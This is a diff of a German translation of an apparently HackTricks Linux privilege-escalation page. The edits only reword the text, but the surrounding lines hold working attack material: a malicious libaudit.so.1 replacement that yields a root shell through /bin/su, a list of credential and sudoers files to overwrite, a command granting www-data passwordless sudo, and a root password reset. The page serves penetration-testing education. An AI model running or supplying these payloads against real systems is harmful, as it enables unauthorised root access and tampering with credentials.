@@ -1,4 +1,4 @@
-# Payloads zur Ausführung
+# Auszuführende Payloads
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -44,14 +44,14 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Überschreiben einer Datei zur Rechteausweitung
+## Überschreiben einer Datei zur Rechteerweiterung
 
 ### Häufige Dateien
 
 - Benutzer mit Passwort zu _/etc/passwd_ hinzufügen
 - Passwort in _/etc/shadow_ ändern
-- Benutzer in _/etc/sudoers_ zu den sudoers hinzufügen
-- Docker über den Docker-Socket missbrauchen, normalerweise in _/run/docker.sock_ oder _/var/run/docker.sock_
+- Benutzer zu sudoers in _/etc/sudoers_ hinzufügen
+- Docker über den Docker-Socket ausnutzen, normalerweise in _/run/docker.sock_ oder _/var/run/docker.sock_
 
 ### Überschreiben einer Library
 
@@ -68,7 +68,7 @@ libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 In diesem Fall versuchen wir, `/lib/x86_64-linux-gnu/libaudit.so.1` zu imitieren.\
-Überprüfe daher, welche Funktionen dieser Bibliothek von der Binärdatei **`su`** verwendet werden:
+Überprüfe daher die von der **`su`**-Binary verwendeten Funktionen dieser Library:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Die Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` und `audit_fd` stammen vermutlich aus der Bibliothek libaudit.so.1. Da libaudit.so.1 durch die bösartige Shared Library überschrieben wird, sollten diese Symbole in der neuen Shared Library vorhanden sein. Andernfalls kann das Programm das Symbol nicht finden und wird beendet.
+Die Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` und `audit_fd` stammen wahrscheinlich aus der Bibliothek libaudit.so.1. Da libaudit.so.1 durch die schädliche Shared Library überschrieben wird, sollten diese Symbole in der neuen Shared Library vorhanden sein. Andernfalls kann das Programm das Symbol nicht finden und wird beendet.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,17 +98,17 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Jetzt erhältst du allein durch den Aufruf von **`/bin/su`** eine Shell als root.
+Jetzt erhalten Sie allein durch Aufrufen von **`/bin/su`** eine Shell als root.
 
 ## Skripte
 
-Kannst du root dazu bringen, etwas auszuführen?
+Können Sie root dazu bringen, etwas auszuführen?
 
-### **www-data zu sudoers**
+### **www-data to sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Root-Passwort ändern**
+### **root-Passwort ändern**
 ```bash
 echo "root:hacked" | chpasswd
 ```
